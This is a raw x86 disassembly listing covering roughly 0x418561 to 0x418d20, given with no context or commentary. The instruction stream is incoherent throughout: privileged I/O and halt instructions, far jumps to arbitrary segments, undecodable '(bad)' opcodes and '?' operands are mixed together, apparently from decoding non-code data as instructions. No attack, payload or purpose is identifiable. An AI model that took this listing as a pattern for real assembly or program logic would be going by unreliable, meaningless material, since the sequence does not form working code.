  418561:	xchg   esi,eax
  418562:	xor    ch,ch
  418564:	adc    esp,DWORD PTR [eax]
  418566:	mov    bh,0xfa
  418568:	push   ebx
  418569:	sbb    edi,esi
  41856b:	jg     0x4185bc
  41856d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41856e:	sbb    BYTE PTR [esp+eiz*2-0x455cb0a],cl
  418575:	mov    ecx,0xbb69bad4
  41857a:	into   
  41857b:	inc    ebx
  41857c:	push   ebp
  41857d:	xlat   BYTE PTR ds:[ebx]
  41857e:	bnd ret 
  418580:	add    ebx,0xffffff93
  418583:	push   ss
  418584:	fcom   DWORD PTR [esi-0x1]
  418587:	outs   dx,BYTE PTR ds:[esi]
  418588:	push   es
  418589:	jbe    0x4185b1
  41858b:	adc    al,BYTE PTR [esi+0x5dde0636]
  418591:	adc    edx,edi
  418593:	cdq    
  418594:	push   esi
  418595:	and    bh,BYTE PTR [ecx]
  418597:	mov    bh,0x3f
  418599:	out    0xb,eax
  41859b:	repnz imul esp,DWORD PTR [edi+0x6e],0x19
  4185a0:	or     esp,0xffffffd9
  4185a3:	hlt    
  4185a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185a5:	jle    0x4185a2
  4185a7:	push   ds
  4185a8:	popa   
  4185a9:	add    al,0x23
  4185ab:	js     0x41861d
  4185ad:	inc    edi
  4185ae:	stos   BYTE PTR es:[edi],al
  4185af:	cmp    edx,DWORD PTR [edx]
  4185b1:	add    al,0x6e
  4185b3:	pop    edx
  4185b4:	cmp    DWORD PTR [eax],0xb4d49a1f
  4185ba:	push   esp
  4185bb:	jmp    0x3f849cc0
  4185c0:	jmp    0x4185f5
  4185c2:	mov    dh,0x62
  4185c4:	inc    eax
  4185c5:	call   0xbce5b059
  4185ca:	aad    0x6c
  4185cc:	mov    edi,0x3684989b
  4185d1:	jb     0x4185d4
  4185d3:	dec    ecx
  4185d4:	out    0xf8,eax
  4185d6:	cli    
  4185d7:	xchg   ecx,eax
  4185d8:	cwde   
  4185d9:	push   ebp
  4185da:	ins    DWORD PTR es:[edi],dx
  4185db:	ss xor ebx,eax
  4185de:	(bad)  
  4185df:	hlt    
  4185e0:	mov    dh,0xff
  4185e2:	dec    esi
  4185e3:	mov    BYTE PTR [edx-0x4],ch
  4185e6:	ja     0x41860d
  4185e8:	hlt    
  4185e9:	imul   esi,DWORD PTR [eax+0x63],0x2d
  4185ed:	jmp    0x346e:0x71f06216
  4185f4:	mov    WORD PTR [esi-0x3],fs
  4185f7:	jge    0x418649
  4185f9:	ds and al,0x78
  4185fc:	ret    
  4185fd:	mov    dh,0x21
  4185ff:	aaa    
  418600:	xor    al,0x55
  418602:	mov    esp,edi
  418604:	add    dl,BYTE PTR [edx+0x42]
  418607:	aaa    
  418608:	pop    ebp
  418609:	out    dx,al
  41860a:	and    al,0x12
  41860c:	popf   
  41860d:	loop   0x418670
  41860f:	(bad)  
  418610:	jl     0x4185e8
  418612:	adc    al,BYTE PTR [ebp-0x5a816695]
  418618:	aam    0xb5
  41861a:	(bad)  
  41861b:	fistp  DWORD PTR [ebp+0x5e]
  41861e:	xor    eax,0x2b987625
  418623:	jge    0x418699
  418625:	inc    edi
  418626:	cmp    eax,0xa96d477
  41862b:	dec    esp
  41862c:	std    
  41862d:	repz jb 0x41865b
  418630:	lds    ebx,FWORD PTR [ebp+0x5623c78b]
  418636:	jl     0x418615
  418638:	mul    DWORD PTR [ebp+0xa]
  41863b:	ss cmp ebx,ebp
  41863e:	jnp    0x418637
  418640:	mov    esi,0xe48e1c69
  418645:	sub    BYTE PTR [ebx],0x1b
  418648:	jmp    0xc7decc50
  41864d:	or     esi,esp
  41864f:	je     0x418664
  418651:	aaa    
  418652:	pop    esi
  418653:	sub    eax,0x53c63ff0
  418658:	jl     0x418643
  41865a:	mov    ds:0xb3470854,eax
  41865f:	(bad)  
  418660:	stos   DWORD PTR es:[edi],eax
  418661:	push   esp
  418662:	jno    0x41862e
  418664:	in     eax,dx
  418665:	xor    al,0x6b
  418667:	or     dh,al
  418669:	mov    ds,WORD PTR [ecx]
  41866b:	fcomp  DWORD PTR [ebp-0x49bab9cd]
  418671:	mov    bl,BYTE PTR [esi+0x6b]
  418674:	mov    al,0x41
  418676:	les    edx,FWORD PTR [edi+0x20149bf1]
  41867c:	scas   eax,DWORD PTR es:[edi]
  41867d:	xchg   esp,eax
  41867e:	dec    eax
  41867f:	or     ch,dh
  418681:	pop    ebx
  418682:	mov    bh,dl
  418684:	rcr    BYTE PTR [ecx-0x2a1de80d],cl
  41868a:	arpl   WORD PTR [edi],bx
  41868c:	cli    
  41868d:	xchg   ebp,eax
  41868e:	mul    cl
  418690:	or     esi,DWORD PTR [edi-0x62]
  418693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418694:	ja     0x1446d865
  41869a:	sbb    eax,0x75c0c0a2
  41869f:	xchg   esp,eax
  4186a0:	fwait
  4186a1:	xchg   esi,eax
  4186a2:	fnsave [esi-0x25]
  4186a5:	in     eax,0xd
  4186a7:	dec    edx
  4186a8:	or     al,0x9d
  4186aa:	sbb    esp,eax
  4186ac:	adc    ebx,DWORD PTR [edx]
  4186ae:	xchg   ebp,eax
  4186af:	mov    ds:0x77574a4a,al
  4186b4:	(bad)  
  4186b5:	(bad)  
  4186b6:	fnsave [edi+0x30620e79]
  4186bc:	mov    ds,WORD PTR [ebx-0x6a]
  4186bf:	adc    ebx,DWORD PTR [ebx]
  4186c1:	sti    
  4186c2:	jecxz  0x418717
  4186c4:	sub    cl,dl
  4186c6:	in     eax,0x33
  4186c8:	jmp    0x4186aa
  4186ca:	pushf  
  4186cb:	pop    ds
  4186cc:	mov    dh,0x19
  4186ce:	jg     0x418738
  4186d0:	fstp   st(7)
  4186d2:	xchg   ebp,eax
  4186d3:	rcr    BYTE PTR [ecx+0x7690cd47],cl
  4186d9:	mov    esi,0xce8dcf93
  4186de:	xor    DWORD PTR [ebx-0x44d89d3a],eax
  4186e4:	or     ebx,DWORD PTR ds:0x922782a8
  4186ea:	xchg   edi,eax
  4186eb:	xlat   BYTE PTR ds:[ebx]
  4186ec:	jb     0x4186d3
  4186ee:	inc    edi
  4186ef:	dec    esi
  4186f0:	iret   
  4186f1:	mov    DWORD PTR [esi-0x37],0x9fbde7c4
  4186f8:	shl    dh,0xbb
  4186fb:	sub    DWORD PTR [esi],edx
  4186fd:	icebp  
  4186fe:	fisub  DWORD PTR [ecx-0x79]
  418701:	jge    0x4186e6
  418703:	mov    bl,0x50
  418705:	xor    ebx,DWORD PTR [eax+0x4b]
  418708:	xor    dh,BYTE PTR gs:[ecx+0x31]
  41870c:	push   ebp
  41870d:	dec    eax
  41870e:	lahf   
  41870f:	add    eax,esp
  418711:	out    dx,al
  418712:	xchg   ebx,eax
  418713:	pop    edi
  418714:	gs ins DWORD PTR es:[edi],dx
  418716:	fisttp WORD PTR [esi]
  418718:	sub    esp,eax
  41871a:	mov    eax,0xd6c836ff
  41871f:	popa   
  418720:	mov    ebp,0x6b5a12fb
  418725:	stos   DWORD PTR es:[edi],eax
  418726:	push   0x1
  418728:	fisubr DWORD PTR [ebx+0x71]
  41872b:	adc    cl,bh
  41872d:	push   0xf6982b73
  418732:	call   esi
  418734:	ss fcomp st(7)
  418737:	retf   0x5e49
  41873a:	xor    BYTE PTR [ecx+ebx*1+0x79],dh
  41873e:	push   ebx
  41873f:	sub    BYTE PTR [edi+0x52b8fa2],al
  418745:	mov    edx,cs
  418747:	repz sbb eax,0xa8890605
  41874d:	das    
  41874e:	or     edx,esp
  418750:	test   al,0x24
  418752:	(bad)  
  418753:	ret    0xc78d
  418756:	mov    edi,0x9aa3d0d6
  41875b:	lds    ebx,FWORD PTR [esp+esi*8-0x4c]
  41875f:	test   BYTE PTR [eax+0x61],dh
  418762:	xchg   ecx,eax
  418763:	neg    BYTE PTR [esi]
  418765:	icebp  
  418766:	inc    esp
  418767:	mov    ch,0xcb
  418769:	jno    0x418787
  41876b:	pop    esi
  41876c:	ror    BYTE PTR [eax-0x5eb372ce],0xdf
  418773:	push   0xffffffc5
  418775:	or     al,0xf8
  418777:	lahf   
  418778:	call   0x7e4ee7be
  41877d:	xor    dh,BYTE PTR [ebx-0x6a]
  418780:	mov    ss,WORD PTR [ebp+ecx*4-0x20]
  418784:	pop    esi
  418785:	or     DWORD PTR [ebx-0x6938659a],ecx
  41878b:	and    esi,ebp
  41878d:	mov    bh,0xd0
  41878f:	shl    DWORD PTR [edx-0x594245cd],0xb9
  418796:	mov    al,cl
  418798:	sbb    DWORD PTR [edx+0x54],0xee1814a1
  41879f:	inc    ecx
  4187a0:	shr    BYTE PTR [edx-0x5f],1
  4187a3:	mov    ds:0x32a032ee,eax
  4187a8:	dec    ebp
  4187a9:	fcmovnbe st,st(7)
  4187ab:	iret   
  4187ac:	mov    ebx,DWORD PTR [ebx]
  4187ae:	and    bl,dh
  4187b0:	sub    al,0x1a
  4187b2:	cmp    eax,0x6bd265f4
  4187b7:	adc    al,0x21
  4187b9:	fsub   QWORD PTR [ebx+0x5be39ad9]
  4187bf:	ja     0x4187bd
  4187c1:	or     DWORD PTR [ecx],0x10
  4187c4:	scas   eax,DWORD PTR es:[edi]
  4187c5:	and    eax,DWORD PTR [edi]
  4187c7:	cmp    esi,DWORD PTR [ebx-0x5e150c49]
  4187cd:	in     al,dx
  4187ce:	leave  
  4187cf:	mov    edi,0xa4efc9df
  4187d4:	shl    BYTE PTR [ebx-0x19420001],0x27
  4187db:	das    
  4187dc:	mov    dh,0x83
  4187de:	mov    dl,0x1c
  4187e0:	mov    esi,0x5fb50ab0
  4187e5:	fadd   QWORD PTR [edx]
  4187e7:	xor    ecx,esp
  4187e9:	(bad)  
  4187ea:	xor    eax,eax
  4187ec:	xor    BYTE PTR [esi+edx*4],al
  4187ef:	cmp    eax,0xd63a3240
  4187f4:	jmp    0x8261c0dd
  4187f9:	outs   dx,BYTE PTR ds:[esi]
  4187fa:	imul   esi,DWORD PTR [esi],0x3a
  4187fd:	jmp    0x835d:0x3dabae4a
  418804:	in     eax,0xf0
  418806:	shl    bh,0x6b
  418809:	stos   DWORD PTR es:[edi],eax
  41880a:	jae    0x4187df
  41880c:	les    esi,FWORD PTR [esi]
  41880e:	push   edx
  41880f:	mov    ah,0xa7
  418811:	jno    0x4187db
  418813:	repz jns 0x4187f5
  418816:	jmp    0x4187fc
  418818:	aas    
  418819:	pop    eax
  41881a:	ficom  WORD PTR [edi+0x7c]
  41881d:	(bad)  
  41881e:	shr    BYTE PTR [esi+0x1944d41d],1
  418824:	fmul   QWORD PTR gs:[edx]
  418827:	jmp    0x6098517c
  41882c:	xor    edx,DWORD PTR [eax+0x79]
  41882f:	inc    ecx
  418830:	pop    es
  418831:	mov    ds:0x69f4475e,al
  418836:	ror    BYTE PTR [edx+0x6c61e11a],cl
  41883c:	mov    eax,ds:0x33b8fa48
  418841:	loop   0x4187c9
  418843:	call   0xc302:0xdc296bb4
  41884a:	cld    
  41884b:	pop    edi
  41884c:	jmp    0x251c9963
  418851:	test   al,0xea
  418853:	loope  0x418879
  418855:	mov    dh,0xf
  418857:	pop    eax
  418858:	push   ss
  418859:	pop    ds
  41885a:	sub    al,0xf0
  41885c:	retf   
  41885d:	in     al,dx
  41885e:	pop    ebx
  41885f:	mov    cl,0x9e
  418861:	mov    dh,ah
  418863:	call   0x93ceb485
  418868:	pop    ss
  418869:	ins    BYTE PTR es:[edi],dx
  41886a:	jmp    0xd0df9ebd
  41886f:	pop    es
  418870:	je     0x4188ad
  418872:	rcl    BYTE PTR [eax+0x26],1
  418875:	mov    edx,?
  418877:	dec    esi
  418878:	fldl2t 
  41887a:	std    
  41887b:	stos   BYTE PTR es:[edi],al
  41887c:	stc    
  41887d:	jne    0x418878
  41887f:	push   esp
  418880:	fnsave [eax+0x6ca4ab84]
  418886:	mov    eax,ds:0x6c834f14
  41888b:	imul   esi,DWORD PTR [edx-0x4504ee9d],0x59a56377
  418895:	sub    BYTE PTR [esi-0x65],al
  418898:	mov    ds:0x29c5ef4f,eax
  41889d:	iret   
  41889e:	push   cs
  41889f:	inc    edi
  4188a0:	pop    es
  4188a1:	push   es
  4188a2:	xchg   BYTE PTR [eax+0x23],al
  4188a5:	and    eax,0x644c953d
  4188aa:	cdq    
  4188ab:	shl    DWORD PTR ds:0x5ca48845,1
  4188b1:	aad    0xf
  4188b3:	mov    edx,0x7a8013f3
  4188b8:	stos   BYTE PTR es:[edi],al
  4188b9:	xor    BYTE PTR [ebx],dl
  4188bb:	ret    
  4188bc:	pushf  
  4188bd:	lods   eax,DWORD PTR ds:[esi]
  4188be:	fsubr  QWORD PTR [ebp+0x4f]
  4188c1:	(bad)  
  4188c2:	fdivr  QWORD PTR [ebx]
  4188c4:	scas   eax,DWORD PTR es:[edi]
  4188c5:	adc    eax,ecx
  4188c7:	jecxz  0x4188be
  4188c9:	jns    0x41892b
  4188cb:	gs dec edx
  4188cd:	ret    
  4188ce:	dec    esi
  4188cf:	cld    
  4188d0:	dec    esi
  4188d1:	pusha  
  4188d2:	or     BYTE PTR [edx-0x4e12f646],0x4e
  4188d9:	sub    eax,0xe44106fb
  4188de:	hlt    
  4188df:	jle    0x4188be
  4188e1:	in     al,dx
  4188e2:	rcl    BYTE PTR [edi+0x372e3a1b],1
  4188e8:	ror    DWORD PTR [ebx-0x4eedaed1],0xc4
  4188ef:	push   ss
  4188f0:	mov    dl,0x3f
  4188f2:	packuswb mm6,mm1
  4188f5:	dec    edx
  4188f6:	out    dx,eax
  4188f7:	(bad)  
  4188f8:	and    esp,ebx
  4188fa:	adc    al,0x1
  4188fc:	jbe    0x418890
  4188fe:	cwde   
  4188ff:	leave  
  418900:	and    al,0xa2
  418902:	xchg   esp,eax
  418903:	or     ebp,DWORD PTR [ebx]
  418905:	ret    
  418906:	mov    cl,0x6a
  418908:	inc    esp
  418909:	stos   DWORD PTR es:[edi],eax
  41890a:	xchg   BYTE PTR [ecx-0x413b1a73],cl
  418910:	mov    WORD PTR [edx+esi*2+0x25f3461f],?
  418917:	int    0xc0
  418919:	in     al,0x79
  41891b:	cdq    
  41891c:	stos   DWORD PTR es:[edi],eax
  41891d:	push   ds
  41891e:	jne    0x4188c4
  418920:	mov    ds:0x6f7a8c24,al
  418925:	outs   dx,DWORD PTR ds:[esi]
  418926:	jnp    0x4188bd
  418928:	pop    edi
  418929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41892a:	sbb    ebx,esp
  41892c:	xchg   ecx,eax
  41892d:	dec    esp
  41892e:	push   0xcd813bbf
  418933:	bound  esp,QWORD PTR [edi-0x2a7d919d]
  418939:	sub    eax,0xad3ac2b5
  41893e:	mov    cl,cl
  418940:	pop    eax
  418941:	scas   eax,DWORD PTR es:[edi]
  418942:	push   esi
  418943:	mov    ds:0x8d6280b,eax
  418948:	icebp  
  418949:	or     esi,ecx
  41894b:	add    esp,esp
  41894d:	aas    
  41894e:	fadd   QWORD PTR [ecx-0xe]
  418951:	out    0xd5,al
  418953:	cld    
  418954:	dec    edx
  418955:	int3   
  418956:	push   ds
  418957:	adc    BYTE PTR [ecx-0x4fd1b03c],ah
  41895d:	cpuid  
  41895f:	int    0xff
  418961:	adc    al,0x16
  418963:	push   ecx
  418964:	test   dl,0x2a
  418967:	and    BYTE PTR [edx],dh
  418969:	cmp    DWORD PTR [edi],eax
  41896b:	dec    edi
  41896c:	xchg   BYTE PTR gs:[eax+0x75a8e831],ah
  418973:	dec    ebp
  418974:	xor    eax,0x50c6114c
  418979:	add    BYTE PTR [edx-0x7a01499a],cl
  41897f:	fcom   DWORD PTR [ebp-0x3e0f7c21]
  418985:	cwde   
  418986:	inc    ebx
  418987:	sar    BYTE PTR [eax-0x5d],0x5f
  41898b:	nop
  41898c:	jnp    0x418970
  41898e:	loop   0x418965
  418990:	mov    eax,0x36e29c90
  418995:	xchg   DWORD PTR [ebx-0x6b0491f2],esi
  41899b:	into   
  41899c:	test   DWORD PTR [eax],ecx
  41899e:	fild   DWORD PTR [esi-0x3a]
  4189a1:	int    0x24
  4189a3:	out    0x85,eax
  4189a5:	push   esp
  4189a6:	mov    DWORD PTR [edx+edx*4],edx
  4189a9:	(bad)  
  4189aa:	lahf   
  4189ab:	jp     0x418945
  4189ad:	pop    ebx
  4189ae:	jbe    0x4189cc
  4189b0:	add    BYTE PTR [ebx],ch
  4189b2:	in     eax,0xcb
  4189b4:	(bad)  [ebp+ecx*4+0x39fba6c7]
  4189bb:	push   esp
  4189bc:	imul   esi,DWORD PTR ds:0x173746dc,0xa314357f
  4189c6:	cld    
  4189c7:	in     al,0x1c
  4189c9:	test   eax,0xfaf333d2
  4189ce:	(bad)  
  4189cf:	mov    ?,WORD PTR [eax+ecx*2]
  4189d2:	iret   
  4189d3:	add    eax,0x1a9055d8
  4189d8:	and    al,0x5a
  4189da:	ja     0x418a3f
  4189dc:	repz (bad) 
  4189de:	cmc    
  4189df:	and    bl,bh
  4189e1:	repz enter 0xd074,0xdd
  4189e6:	add    bl,cl
  4189e8:	inc    DWORD PTR [eax-0x272e834e]
  4189ee:	or     eax,0x9f882641
  4189f3:	fadd   DWORD PTR [ecx+0x5fc398eb]
  4189f9:	mov    ebx,0x16b3b258
  4189fe:	push   ds
  4189ff:	cmc    
  418a00:	pop    esp
  418a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a02:	push   ebp
  418a03:	jg     0x418a43
  418a05:	pop    es
  418a06:	iret   
  418a07:	sbb    DWORD PTR [ebp+0x43],esp
  418a0a:	leave  
  418a0b:	in     eax,0xb4
  418a0d:	jb     0x4189b6
  418a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a10:	mov    ebp,DWORD PTR [ebx]
  418a12:	leave  
  418a13:	jecxz  0x4189ce
  418a15:	pop    ecx
  418a16:	or     esp,ebp
  418a18:	jne    0x418a97
  418a1a:	cli    
  418a1b:	pop    edx
  418a1c:	jg     0x418a81
  418a1e:	je     0x418a07
  418a20:	mov    al,0xd
  418a22:	or     al,0xfa
  418a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a25:	leave  
  418a26:	sub    al,0xe5
  418a28:	adc    DWORD PTR [edx+0x6],edi
  418a2b:	out    0xdb,al
  418a2d:	in     al,dx
  418a2e:	test   BYTE PTR [edx-0x1f],0x25
  418a32:	in     al,dx
  418a33:	scas   eax,DWORD PTR es:[edi]
  418a34:	mov    cs,WORD PTR [edx]
  418a36:	mov    ah,0xea
  418a38:	adc    al,0x5a
  418a3a:	test   eax,0xfd28b755
  418a3f:	jge    0x418a75
  418a41:	dec    BYTE PTR [esi+0x50]
  418a44:	fisubr DWORD PTR [ebx+ecx*1-0x1f]
  418a48:	clc    
  418a49:	push   cs
  418a4a:	mov    dl,0x6
  418a4c:	cmp    BYTE PTR [eax],0x3b
  418a4f:	les    ebp,FWORD PTR [eax+0x63]
  418a52:	test   BYTE PTR ds:0xe7c416df,al
  418a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a59:	outs   dx,BYTE PTR ds:[esi]
  418a5a:	mov    edx,0x388fd9
  418a5f:	cli    
  418a60:	mov    edi,0x59858821
  418a65:	jmp    0xc25dad66
  418a6a:	scas   al,BYTE PTR es:[edi]
  418a6b:	fsubr  DWORD PTR [ebx+0x99a410e]
  418a71:	jae    0x418a07
  418a73:	xor    DWORD PTR [edi-0x23],esi
  418a76:	rcl    bh,1
  418a78:	xor    al,0x36
  418a7a:	(bad)  
  418a7b:	call   0x8444:0x8b734bb7
  418a82:	(bad)  
  418a84:	daa    
  418a85:	loope  0x418a0f
  418a87:	imul   eax,edi,0x72
  418a8a:	dec    ecx
  418a8b:	cmp    al,0xd
  418a8d:	mov    esi,0x2b893e2a
  418a92:	jbe    0x418acf
  418a94:	xchg   edx,eax
  418a95:	pop    ebx
  418a96:	mov    edi,0xec698ffb
  418a9b:	fs mov ebx,0x42ad910a
  418aa1:	dec    edi
  418aa2:	fs pop esi
  418aa4:	or     cl,0x18
  418aa7:	dec    esp
  418aa8:	dec    ecx
  418aa9:	sub    eax,0xcac8f281
  418aae:	fnsave ds:0x22435bce
  418ab4:	in     al,0x94
  418ab6:	inc    ebp
  418ab7:	mov    cl,0x6f
  418ab9:	rol    BYTE PTR [edx],cl
  418abb:	mov    al,ds:0x70d185e7
  418ac0:	adc    esi,DWORD PTR [esi+0x2c]
  418ac3:	xor    eax,0x6abb7439
  418ac8:	sbb    BYTE PTR [edi+0x7e68e302],dl
  418ace:	pop    esi
  418acf:	repz mov ebx,0x9691c35f
  418ad5:	mov    dl,0x4a
  418ad7:	mov    esi,0xdedad9f7
  418adc:	xchg   esp,eax
  418add:	sbb    DWORD PTR es:[ecx],edi
  418ae0:	mov    cl,0x2b
  418ae2:	lahf   
  418ae3:	rcr    DWORD PTR [edi-0x6a383526],cl
  418ae9:	push   esp
  418aea:	cmp    edx,ebp
  418aec:	popa   
  418aed:	js     0x418b4c
  418aef:	cmp    ch,BYTE PTR ds:0x6065c0ba
  418af5:	jmp    0x418ab7
  418af7:	adc    ebx,edx
  418af9:	xchg   edi,eax
  418afa:	and    al,0x1
  418afc:	or     al,0xa5
  418afe:	cwde   
  418aff:	or     ch,dl
  418b01:	dec    edi
  418b02:	in     eax,0x3d
  418b04:	push   ebp
  418b05:	add    BYTE PTR [ecx-0x30f565ec],al
  418b0b:	jb     0x418af5
  418b0d:	(bad)  
  418b0e:	arpl   dx,dx
  418b10:	iret   
  418b11:	in     al,dx
  418b12:	iret   
  418b13:	dec    esi
  418b14:	shl    DWORD PTR [esi],cl
  418b16:	push   esi
  418b17:	enter  0x9a49,0xeb
  418b1b:	mov    al,ds:0x23ab4d12
  418b20:	pop    ecx
  418b21:	pop    ecx
  418b22:	mov    ch,0x44
  418b24:	xor    al,0xf4
  418b26:	and    BYTE PTR [ebp-0x513bd1c4],cl
  418b2c:	mov    bh,0x9f
  418b2e:	les    edx,FWORD PTR [ecx]
  418b30:	pop    ds
  418b31:	sub    ebp,DWORD PTR [eax-0x3c]
  418b34:	lahf   
  418b35:	push   ebp
  418b36:	(bad)  
  418b38:	mov    bl,0x2d
  418b3a:	pushf  
  418b3b:	sbb    al,0xc3
  418b3d:	imul   edi,ecx,0x70
  418b40:	jle    0x418b21
  418b42:	or     esp,esp
  418b44:	pop    ds
  418b45:	mov    edx,DWORD PTR [ebx]
  418b47:	push   cs
  418b48:	mov    ecx,0xda949261
  418b4d:	mov    edx,DWORD PTR [eax+esi*8]
  418b50:	mov    edi,0xda6f8724
  418b55:	adc    cl,BYTE PTR [ebx+0x4d]
  418b58:	mov    ds:0x3ae0bc2d,eax
  418b5d:	and    al,0x5d
  418b5f:	fwait
  418b60:	out    dx,eax
  418b61:	xchg   ebx,eax
  418b62:	pop    ebx
  418b63:	xchg   ebp,eax
  418b64:	mov    esp,0xc30919d1
  418b69:	je     0x418b57
  418b6b:	aaa    
  418b6c:	push   edi
  418b6d:	or     eax,0x34bd542a
  418b72:	xor    ebp,DWORD PTR [eax]
  418b74:	dec    esi
  418b75:	pop    eax
  418b76:	mov    ebx,0xa32a26b7
  418b7b:	mov    edi,0xcce75b4a
  418b80:	inc    ebx
  418b81:	and    al,BYTE PTR [ecx]
  418b83:	jg     0x418b09
  418b85:	xchg   DWORD PTR [edx-0x68de2f73],esi
  418b8b:	sbb    dl,BYTE PTR [ebp-0x6ee02b5d]
  418b91:	scas   eax,DWORD PTR es:[edi]
  418b92:	push   eax
  418b93:	icebp  
  418b94:	push   esi
  418b95:	test   eax,0xc426ac5f
  418b9a:	imul   edx,DWORD PTR [esi+0x1ad84e5f],0x529a5dd9
  418ba4:	in     eax,dx
  418ba5:	call   0xa61c:0x3d0e9c29
  418bac:	push   edx
  418bad:	push   edi
  418bae:	cs xchg esp,eax
  418bb0:	(bad)  
  418bb2:	adc    al,0xd4
  418bb4:	inc    ebx
  418bb5:	pop    ds
  418bb6:	mov    eax,0xef113abe
  418bbb:	pop    edi
  418bbc:	push   edi
  418bbd:	xchg   ecx,eax
  418bbe:	call   0xcbce:0xc6f17a7e
  418bc5:	pusha  
  418bc6:	inc    ecx
  418bc7:	push   ecx
  418bc8:	xchg   esi,eax
  418bc9:	test   eax,0x9cd2157b
  418bce:	xor    al,0x28
  418bd0:	stc    
  418bd1:	jecxz  0x418c4f
  418bd3:	cmp    eax,0x79b83d63
  418bd8:	xor    dh,bh
  418bda:	test   eax,0x191af8ca
  418bdf:	dec    ecx
  418be0:	fist   DWORD PTR [ecx+0x0]
  418be3:	jg     0x418bd4
  418be5:	je     0x418c3d
  418be7:	popf   
  418be8:	lds    edx,FWORD PTR [ecx-0x1da0e17b]
  418bee:	out    dx,eax
  418bef:	and    esi,DWORD PTR [edx+0x32]
  418bf2:	leave  
  418bf3:	jmp    0xc4bc10b1
  418bf8:	lods   eax,DWORD PTR ss:[esi]
  418bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bfb:	call   0x5dd2:0x38865ca6
  418c02:	jo     0x418bae
  418c04:	add    eax,0x543456f8
  418c09:	jp     0x418bdd
  418c0b:	nop
  418c0c:	mov    ecx,0x38080243
  418c11:	loope  0x418c92
  418c13:	popf   
  418c14:	(bad)  
  418c15:	mov    esp,0xdcc5f82e
  418c1a:	and    al,0xcd
  418c1c:	popf   
  418c1d:	inc    edi
  418c1e:	lea    ebx,ds:[esi-0x54]
  418c22:	rcr    DWORD PTR [ecx+0x36b589c],cl
  418c28:	out    dx,al
  418c29:	sahf   
  418c2a:	mov    bl,0x1a
  418c2c:	iret   
  418c2d:	inc    ebx
  418c2e:	lahf   
  418c2f:	outs   dx,DWORD PTR ds:[esi]
  418c30:	call   0x8cb25f55
  418c35:	mov    BYTE PTR [eax+edx*2],bl
  418c38:	repz hlt 
  418c3a:	xor    al,0x96
  418c3c:	sbb    BYTE PTR [eax+esi*1-0x1259d0b7],0xd9
  418c44:	sbb    edi,DWORD PTR [ecx]
  418c46:	ffree  st(5)
  418c48:	lds    ebx,FWORD PTR [eax-0x72189cfd]
  418c4e:	cmp    DWORD PTR [ebx+eiz*2+0x6e],esp
  418c52:	rol    ebp,cl
  418c54:	in     eax,dx
  418c55:	xchg   esp,eax
  418c56:	repnz inc ebp
  418c58:	inc    esp
  418c59:	and    BYTE PTR [ebx-0x6bccdeb0],ch
  418c5f:	cli    
  418c60:	lods   eax,DWORD PTR ds:[esi]
  418c61:	push   ss
  418c62:	and    ebp,edx
  418c64:	xlat   BYTE PTR ds:[ebx]
  418c65:	scas   eax,DWORD PTR es:[edi]
  418c66:	fidivr DWORD PTR [eax-0x80]
  418c69:	fstp   QWORD PTR ds:0xc8995040
  418c6f:	xchg   edi,eax
  418c70:	jmp    0x5af8:0x3425db2a
  418c77:	xchg   esp,eax
  418c78:	mov    ss,eax
  418c7a:	in     al,dx
  418c7b:	in     eax,0x83
  418c7d:	retf   0x1fbf
  418c80:	sbb    ecx,DWORD PTR [esi]
  418c82:	and    BYTE PTR [esi],bh
  418c84:	test   al,0xd1
  418c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c87:	ja     0x418ccf
  418c89:	in     eax,dx
  418c8a:	aam    0x8f
  418c8c:	js     0x418c38
  418c8e:	push   edi
  418c8f:	sub    al,0x3e
  418c91:	mov    esp,0xb4a42e4f
  418c96:	je     0x418c74
  418c98:	clc    
  418c99:	xor    ecx,DWORD PTR [edi-0x49]
  418c9c:	adc    al,BYTE PTR [eax-0x15]
  418c9f:	mov    ss,WORD PTR [esi-0x6]
  418ca2:	inc    ecx
  418ca3:	jecxz  0x418c25
  418ca5:	sbb    DWORD PTR [edx+0x1c],0xffffffcd
  418ca9:	pop    ebx
  418caa:	cmp    al,BYTE PTR ds:0xb0e7fb4
  418cb0:	pop    ebp
  418cb1:	into   
  418cb2:	mov    WORD PTR ss:[edi],?
  418cb5:	jns    0x418d34
  418cb7:	push   edi
  418cb8:	shr    edi,cl
  418cba:	aaa    
  418cbb:	in     eax,dx
  418cbc:	outs   dx,BYTE PTR ds:[esi]
  418cbd:	xor    dh,BYTE PTR [edi-0x66]
  418cc0:	mov    eax,ds:0xfea64d43
  418cc5:	fiadd  WORD PTR [esi]
  418cc7:	fdiv   QWORD PTR [ebx]
  418cc9:	add    DWORD PTR [esi+0x2f6ab593],edi
  418ccf:	std    
  418cd0:	mov    ch,0x85
  418cd2:	xor    al,0x60
  418cd4:	in     al,0x36
  418cd6:	aaa    
  418cd7:	int    0xc9
  418cd9:	cmc    
  418cda:	cmp    BYTE PTR [ebx-0x525c63a],bh
  418ce0:	pop    ebp
  418ce1:	mov    BYTE PTR [ebx-0x68],dl
  418ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ce5:	pop    esi
  418ce6:	(bad)  
  418ce7:	int3   
  418ce8:	jno    0x418cc1
  418cea:	mov    edi,0xf05abad8
  418cef:	retf   
  418cf0:	sbb    eax,0xb499a625
  418cf5:	div    DWORD PTR [eax+0x50e0f6d5]
  418cfb:	cdq    
  418cfc:	in     eax,dx
  418cfd:	stos   BYTE PTR es:[edi],al
  418cfe:	into   
  418cff:	xor    DWORD PTR [esi-0x2b],ebp
  418d02:	imul   esp
  418d04:	and    esp,ebx
  418d06:	stc    
  418d07:	stc    
  418d08:	adc    DWORD PTR [ecx],esp
  418d0a:	test   eax,0xfca0f18
  418d0f:	xchg   ebp,eax
  418d10:	addr16 test eax,0x1e8319a0
  418d16:	jg     0x418d83
  418d18:	inc    edx
  418d19:	sub    al,0xac
  418d1b:	cmp    al,0x5f
  418d1d:	mov    fs,ebp
  418d1f:	inc    ecx
  418d20:	cmp    dl,dh
